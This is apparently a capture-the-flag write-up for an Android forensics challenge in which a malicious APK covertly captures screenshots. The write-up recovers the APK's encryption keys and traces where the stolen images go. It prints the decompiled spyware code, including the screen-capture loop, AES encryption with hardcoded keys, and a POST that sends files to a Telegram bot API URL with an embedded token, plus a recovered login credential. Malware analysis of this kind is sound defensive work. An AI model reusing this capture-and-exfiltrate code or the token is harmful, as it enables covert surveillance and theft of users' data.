# HMICast

Given an android /data folder dump, participant expected to answer every questions to get the flag.


### Q1: Is the phone rooted?
Answer: yes 

Analyze the /data/app folder and list all of the installed APK inside the phone and we will get the Magisk APK.

### Q2: What is the malicious package name?
Answer: com.itsec.android.hmi

Analyze the /data/app folder and list all of the installed APK inside the phone and we will get the malicious APK

### Q3: What is the download link of the malicious package? 
Answer: https://mega.nz/file/uddABYRD#c__klT8jtAiAhKLWNfuOuywoZiRfZfSXqxxryrVslj8

ALEAPP will do for automatic to analyze chrome history or see the history manually.

### Q4: What is the Android API that attacker use to capture victim's screen? 
Answer: android.media.projection.MediaProjectionManager

Time to analyze the APK. Based on the question, this APK will capture victim's screen using MediaProjectionManager that was implemented on ScreenCaptureService.kt


```
package com.itsec.android.hmi;

import I0.c;

....snipped....
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
....snipped....

public final int onStartCommand(Intent intent, int i2, int i3) {
        VirtualDisplay virtualDisplay;
        Bundle bundle;
        int i4;
        f = true;
        if (intent == null) {
            return 2;
        }
        int intExtra = intent.getIntExtra("resultCode", 0);
        Intent intent2 = (Intent) intent.getParcelableExtra("resultData");
        if (intent2 == null) {
            return 2;
        }
        Object systemService = getSystemService("media_projection");
        f.d(systemService, "null cannot be cast to non-null type android.media.projection.MediaProjectionManager");
        this.f1880a = ((MediaProjectionManager) systemService).getMediaProjection(intExtra, intent2);
        DisplayMetrics displayMetrics = Resources.getSystem().getDisplayMetrics();
        int i5 = displayMetrics.widthPixels;
        int i6 = displayMetrics.heightPixels;
        int i7 = displayMetrics.densityDpi;
        ImageReader newInstance = ImageReader.newInstance(i5, i6, 1, 2);
        this.f1881c = newInstance;
        MediaProjection mediaProjection = this.f1880a;
        if (mediaProjection != null) {
            virtualDisplay = mediaProjection.createVirtualDisplay("", i5, i6, i7, 16, newInstance != null ? newInstance.getSurface() : null, null, null);
        } else {
            virtualDisplay = null;
        }
```



### Q5: What is the secretkey for image encryption process? 
Answer: dPGgF7tQlBaGqqmj

Decompile the APK and analyze the native and Kotlin code. The kotlin code seems protected / obfuscated with ProGuard, utilize search function to retrieve the CryptoService class.

```
package com.itsec.android.hmi;

/* loaded from: classes.dex */
public final class CryptoService$stringfromnative {

    /* renamed from: a, reason: collision with root package name */
    public static final CryptoService$stringfromnative f1878a = new Object();

    /* JADX WARN: Type inference failed for: r0v0, types: [java.lang.Object, com.itsec.android.hmi.CryptoService$stringfromnative] */
    static {
        System.loadLibrary("native-lib");
    }

    public final native String getAES();

    public final native String getRSA();

    public final native String getRSAKey();
}
```

As we can see here, class a holds several function such as AES and RSA encryption. 

We go with the RSA function first that will decrypt `f394c` parameter which is the AES private key (half portion) and will be concatenated with String `b` after RSA decryption.
```
package I0;

import W0.f;
import c1.l;
import com.itsec.android.hmi.CryptoService$stringfromnative;
import java.nio.charset.Charset;
import java.security.KeyFactory;
import java.security.PrivateKey;
import java.security.spec.PKCS8EncodedKeySpec;
import java.util.Base64;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/* loaded from: classes.dex */
public abstract class a {

    /* renamed from: a, reason: collision with root package name */
    public static final String f393a = CryptoService$stringfromnative.f1878a.getAES();
    public static final String b = "lBaGqqmj";

    /* renamed from: c, reason: collision with root package name */
    public static final String f394c = "Ud1PxFTYWLrqDduwBCfbRnbOGT2AasCFObFWPHInhsg9eACzYirAHSaqa9QCmcgrA7aQDVRuOxmYyy5U3h1jLQbCz97cNjEUCVl1Hk6G7L/uOGqCOsp1aabaQ7hBoIVL9E00OMRK7uVtQQgT4CzJZXI1fsLovFG1MBNdENGVE8M=";

    /* renamed from: d, reason: collision with root package name */
    public static final byte[] f395d;

    static {
        byte[] bytes = "Cj7pYMR6FqYFKRYi".getBytes(c1.a.f1544a);
        f.e(bytes, "this as java.lang.String).getBytes(charset)");
        f395d = bytes;
    }

    public static byte[] a(byte[] bArr) {
        byte[] bArr2;
        CryptoService$stringfromnative cryptoService$stringfromnative = CryptoService$stringfromnative.f1878a;
        String rSAKey = cryptoService$stringfromnative.getRSAKey();
        String str = f394c;
        f.f(str, "base64Encrypted");
        f.f(rSAKey, "privateKeyPEM");
        String w02 = l.w0(l.w0(rSAKey, "-----BEGIN RSA PRIVATE KEY-----", ""), "-----END RSA PRIVATE KEY-----", "");
        Pattern compile = Pattern.compile("\\s");
        f.e(compile, "compile(pattern)");
        String replaceAll = compile.matcher(w02).replaceAll("");
        f.e(replaceAll, "nativePattern.matcher(in…).replaceAll(replacement)");
        PrivateKey generatePrivate = KeyFactory.getInstance("RSA").generatePrivate(new PKCS8EncodedKeySpec(Base64.getDecoder().decode(replaceAll)));
        f.e(generatePrivate, "generatePrivate(...)");
        Cipher cipher = Cipher.getInstance(cryptoService$stringfromnative.getRSA());
        cipher.init(2, generatePrivate);
        byte[] doFinal = cipher.doFinal(Base64.getDecoder().decode(str));
        f.c(doFinal);
        Charset charset = c1.a.f1544a;
        String str2 = new String(doFinal, charset) + b;
        Cipher cipher2 = Cipher.getInstance(f393a);
        if (str2 != null) {
            bArr2 = str2.getBytes(charset);
            f.e(bArr2, "this as java.lang.String).getBytes(charset)");
        } else {
            bArr2 = null;
        }
        cipher2.init(1, new SecretKeySpec(bArr2, "AES"), new IvParameterSpec(f395d));
        byte[] doFinal2 = cipher2.doFinal(bArr);
        f.e(doFinal2, "doFinal(...)");
        return doFinal2;
    }
}
```

Analyzing the native library, we can see all of the function that called from native lib to kotlin code such as the AES & RSA algorithm and others. (Frida may be useful for dynamic analysis, now we're going to perform static analysis)

Here is the `getRSAKey()` function that will be used on RSA decryption to get the AES key. there is a function called cb64 that receive text `unk_13BD0` to be processed.

```
getRSAKey():
__int64 __fastcall Java_com_itsec_android_hmi_CryptoService_00024stringfromnative_getRSAKey(__int64 a1)
{
  unsigned __int64 v1; // x20
  __int64 v2; // x19
  __int64 result; // x0
  char v4; // [xsp+8h] [xbp-2008h]
  __int64 v5; // [xsp+2008h] [xbp-8h]

  v1 = _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));
  v2 = a1;
  v5 = *(_QWORD *)(v1 + 40);
  cb64((const unsigned __int16 *)&unk_13BD0, &v4, 0x2000);
  result = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v2 + 1336LL))(v2, &v4);
  *(_QWORD *)(v1 + 40);
  return result;
}
```

This is the `cb64()` function that will perform custom Base64 encoding mapped with custom charset

```
__int64 __fastcall cb64(const unsigned __int16 *a1, char *a2, signed int a3)
{
  unsigned __int64 v3; // x22
  signed int v4; // w20
  char *v5; // x19
  const unsigned __int16 *v6; // x21
  __int64 result; // x0
  int v8; // w11
  unsigned __int64 v9; // x9
  signed __int64 v10; // x13
  __int64 v11; // x12
  unsigned __int64 v12; // x8
  char *v13; // x13
  unsigned __int64 v15; // x9
  __int64 v16; // x10
  unsigned __int64 v17; // x16
  char v18[8192]; // [xsp+8h] [xbp-2008h]
  char v19[8192]; // [xsp+Bh] [xbp-2005h]
  __int64 v20; // [xsp+2008h] [xbp-8h]

  v3 = _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));
  v4 = a3;
  v5 = a2;
  v6 = a1;
  v20 = *(_QWORD *)(v3 + 40);
  result = memset(v18, 0LL, 0x2000LL);
  v8 = *v6;
  if ( *v6 )
  {
    v9 = 0LL;
    v10 = 0LL;
    do
    {
      v11 = 0LL;
      v12 = v10;
      while ( word_13AE0[v11] != v8 )
      {
        if ( ++v11 == 64 )
          goto LABEL_11;
      }
      v13 = &v18[v10];
      *v13 = ((unsigned int)v11 >> 5) & 1;
      v8 = v6[v9 + 1];
      v18[v12 | 1] = ((unsigned int)v11 >> 4) & 1;
      v13[2] = ((unsigned int)v11 >> 3) & 1;
      v13[3] = ((unsigned int)v11 >> 2) & 1;
      v13[4] = ((unsigned int)v11 >> 1) & 1;
      v13[5] = v11 & 1;
      if ( !v8 )
        break;
      v10 = v12 + 6;
    }
    while ( v9++ < 0x7FF );
    LODWORD(v12) = v12 + 6;
LABEL_11:
    v15 = 0LL;
    if ( (signed int)v12 >= 8 && v4 >= 2 )
    {
      v15 = 0LL;
      v16 = 0LL;
      v12 = (unsigned int)v12;
      do
      {
        v17 = v15++;
        v5[v17] = v19[v16 + 4] | 2
                               * (v19[v16 + 3] | 4
                                               * (v19[v16 + 1] | 4 * (v19[v16 - 1] | 4 * v18[v16] | 2 * v19[v16 - 2]) | 2 * v19[v16]) | 2 * v19[v16 + 2]);
        if ( v16 + 15 >= v12 )
          break;
        v16 += 8LL;
      }
      while ( v15 < (unsigned int)(v4 - 1) );
    }
  }
  else
  {
    v15 = 0LL;
  }
  v5[v15] = 0;
  *(_QWORD *)(v3 + 40);
  return result;
}

Charset *(word_13AE0):
0x7C8C, 0x7C90, 0x7C93, 0x7CA0, 0x7CA6, 0x7CA9, 0x7CAB
0x7CAD, 0x7CAF, 0x7CB0, 0x7CB3, 0x7CB4, 0x7CB5, 0x7CB6
0x7CB7, 0x7CBA, 0x7CC9, 0x7CCB, 0x7CCD, 0x7CCE, 0x7CCF
0x7CD0, 0x7CD1, 0x7CD2, 0x7CD3, 0x7CD4, 0x7CD6, 0x7CD7
0x7CD8, 0x7CDA, 0x7CDB, 0x7CDC, 0x7CDD, 0x7CDE, 0x7CDF
0x7CE0, 0x7CE2, 0x7CE3, 0x7CE4, 0x7CE5, 0x7CE6, 0x7CE7
0x7CE8, 0x7CE9, 0x7CEA, 0x7CEC, 0x7CED, 0x7CEE, 0x7C4A
0x7C4E, 0x7C5C, 0x7C6B, 0x7C70, 0x7C78, 0x7C81, 0x7C87
0x7CBC, 0x7CBD, 0x7CBF, 0x7CC0, 0x7CC1, 0x7CC3, 0x7CC5
0x7CC8
```

how the custom base64 works - simple way:

1. Convert the encrypted text to bytes
2. Convert each bytes into binary
3. Join all of the bits
4. Split into 6 bits
5. Convert each (6 bits) into number to map with custom charset

After that, create simple script to decode the encoded strings (same way with `getAES()` and `getRSA()` basically it was only for simple cryptography algorithm to be passed to kotlin code.)

First part of the AES key: `dPGgF7tQ` retrieved by decodi the `Ud1PxFTYWLrqDduwBCfbRnbOGT2AasCFObFWPHInhsg9eACzYirAHSaqa9QCmcgrA7aQDVRuOxmYyy5U3h1jLQbCz97cNjEUCVl1Hk6G7L/uOGqCOsp1aabaQ7hBoIVL9E00OMRK7uVtQQgT4CzJZXI1fsLovFG1MBNdENGVE8M=` with RSA private key (obtained from native lib)

``` 
obfuscated RSA private key: 
.rodata:0000000000013BD0 unk_13BD0       DCB 0xB4                ; DATA XREF: Java_com_itsec_android_hmi_CryptoService_00024stringfromnative_getRSAKey+28↓o
.rodata:0000000000013BD1                 DCB 0x7C ; |
.rodata:0000000000013BD2                 DCB 0xCD
.rodata:0000000000013BD3                 DCB 0x7C ; |
.rodata:0000000000013BD4                 DCB 0x70 ; p
.rodata:0000000000013BD5                 DCB 0x7C ; |
.rodata:0000000000013BD6                 DCB 0xEC
.rodata:0000000000013BD7                 DCB 0x7C ; |
.rodata:0000000000013BD8                 DCB 0xB4
.rodata:0000000000013BD9                 DCB 0x7C ; |
.rodata:0000000000013BDA                 DCB 0xCD
.rodata:0000000000013BDB                 DCB 0x7C ; |
.rodata:0000000000013BDC                 DCB 0x78 ; x
.rodata:0000000000013BDD                 DCB 0x7C ; |

snipped
```

Combine the first part of AES key and second part and we will get the full AES Key `dPGgF7tQlBaGqqmj`.

AES encryption will be used on ScreenCaptureService to encrypt taken screenshot and will be saved on /files/.logs/log_timestamp.enc

```
package I0;

public final void run() {
        String str;
        o oVar;
        g gVar;
        int i2;
        boolean z2;
        i1.a c2;
        long j2;
        C0236j c0236j;
        g gVar2 = null;
        switch (this.f400a) {
            case 0:
                ScreenCaptureService screenCaptureService = (ScreenCaptureService) this.b;
                ImageReader imageReader = screenCaptureService.f1881c;
                Image acquireLatestImage = imageReader != null ? imageReader.acquireLatestImage() : null;
                if (acquireLatestImage != null) {
                    Image.Plane[] planes = acquireLatestImage.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    Bitmap createBitmap = Bitmap.createBitmap(((planes[0].getRowStride() - (acquireLatestImage.getWidth() * pixelStride)) / pixelStride) + acquireLatestImage.getWidth(), acquireLatestImage.getHeight(), Bitmap.Config.ARGB_8888);
                    f.e(createBitmap, "createBitmap(...)");
                    createBitmap.copyPixelsFromBuffer(buffer);
                    acquireLatestImage.close();
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    createBitmap.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
                    byte[] byteArray = byteArrayOutputStream.toByteArray();
                    try {
                        String str2 = a.f393a;
                        f.c(byteArray);
                        byte[] a2 = a.a(byteArray);
                        File file = new File(screenCaptureService.getExternalFilesDir(null), ".logs");
                        if (!file.exists()) {
                            file.mkdirs();
                        }
                        str = "log_" + System.currentTimeMillis() + ".enc";
                        FileOutputStream fileOutputStream = new FileOutputStream(new File(file, str));
                        try {
                            fileOutputStream.write(a2);
                            l.o(fileOutputStream, null);
                        } finally {
                        }
                    } catch (Exception e2) {
                        Log.i("ser0tonin", "error: " + e2.getMessage(), e2);
                        str = "a";
                    }


Snipped....
```

### Q6 : Where the encrypted image sent to?
Answer: Telegram

All of the image will be sent to Telegram and will be processed by Telegram Bot
```
 if (!f.a(oVar3.b, "multipart")) {
                        throw new IllegalArgumentException(("multipart != " + oVar3).toString());
                    }
                    byte[] bytes = "-1002300479215".getBytes(c1.a.f1544a);
                    f.e(bytes, "this as java.lang.String).getBytes(charset)");
                    int length = bytes.length;
                    g1.b.b(bytes.length, 0, length);
                    arrayList.add(d.r("chat_id", null, new v(null, length, bytes, 0)));
                    String name = file2.getName();
                    Pattern pattern = o.f2348d;
                    try {
                        oVar = d.w("application/octet-stream");
                    } catch (IllegalArgumentException unused) {
                        oVar = null;
                    }
                    arrayList.add(d.r("document", name, new u(oVar, file2)));
                    if (!(!arrayList.isEmpty())) {
                        throw new IllegalStateException("Multipart body must have at least one part.".toString());
                    }
                    q qVar = new q(b, oVar3, g1.b.w(arrayList));
                    F.f fVar = new F.f();
                    String str3 = "https://api.telegram.org/bot8369776437:AAFYoPjexy1-_wdpuCHAjIS4ZW9eJ6B-T0Q/sendDocument";
                    if (c1.l.y0("https://api.telegram.org/bot8369776437:AAFYoPjexy1-_wdpuCHAjIS4ZW9eJ6B-T0Q/sendDocument", "ws:", true)) {
                        str3 = "http:".concat("ps://api.telegram.org/bot8369776437:AAFYoPjexy1-_wdpuCHAjIS4ZW9eJ6B-T0Q/sendDocument");
                    } else if (c1.l.y0("https://api.telegram.org/bot8369776437:AAFYoPjexy1-_wdpuCHAjIS4ZW9eJ6B-T0Q/sendDocument", "wss:", true)) {
                        str3 = "https:".concat("s://api.telegram.org/bot8369776437:AAFYoPjexy1-_wdpuCHAjIS4ZW9eJ6B-T0Q/sendDocument");
                    }
                    f.f(str3, "<this>");
                    f1.l lVar = new f1.l();
                    lVar.d(null, str3);
                    fVar.f151c = lVar.a();
                    fVar.j("POST", qVar);
                    t a3 = fVar.a();
                    j1.j jVar2 = new j1.j(rVar, a3);
                    e eVar = new e(3);
                    if (!jVar2.g.compareAndSet(false, true)) {
                        throw new IllegalStateException("Already Executed".toString());
                    }
                    n nVar = n.f3271a;
                    jVar2.f2963h = n.f3271a.g();
                    jVar2.f2962e.getClass();
                    s sVar = rVar.f2360a;
                    g gVar3 = new g(jVar2, eVar);
                    sVar.getClass();
                    synchronized (sVar) {
                        ((ArrayDeque) sVar.b).add(gVar3);
                        String str4 = ((m) a3.b).f2344d;
                        Iterator it = ((ArrayDeque) sVar.f1172c).iterator();
                        while (true) {
                            if (it.hasNext()) {
                                gVar = (g) it.next();
                                if (f.a(((m) gVar.f2956c.b.b).f2344d, str4)) {
                                }
                            } else {
                                Iterator it2 = ((ArrayDeque) sVar.b).iterator();
                                while (it2.hasNext()) {
                                    gVar = (g) it2.next();
                                    if (f.a(((m) gVar.f2956c.b.b).f2344d, str4)) {
                                    }
                                }
                            }
                        }
                        gVar2 = gVar;
                        if (gVar2 != null) {
                            gVar3.b = gVar2.b;
                        }
                    }
                    sVar.h();
                }
                ((ScreenCaptureService) this.b).f1882d.postDelayed(this, 30000L);
                return;
```

### Q7 : What is the bot API token?
Answer: 8369776437:AAFYoPjexy1-_wdpuCHAjIS4ZW9eJ6B-T0Q

### Q8 : What is the bot username?
Answer: guntershelpsBot

By using the bot API token, we can visit the telegram api and perform get request to `https://api.telegram.org/bot8369776437:AAFYoPjexy1-_wdpuCHAjIS4ZW9eJ6B-T0Q/getUpdates` then we will get the bot's name.

### Q9 : What is the login credential that was captured and sent at this window of time [Tuesday, July 29, 2025 5:26 AM - Tuesday, July 29, 2025 5:30 AM]?
Answer: operator1337:HM1_standin9_Str0nk

By visiting the bot on telegram we will get the Telegram group link on bot's about page. Converting the timestamp `Tuesday, July 29, 2025 5:26 AM` -> `1753741560` we can get the image on that timestamp and decrypt the image with AES key (`dPGgF7tQlBaGqqmj`) and IV (`Cj7pYMR6FqYFKRYi`)


### Flag: `ITSEC{gunt3rs_is_th3_culpr1t_88ebf35eac}`

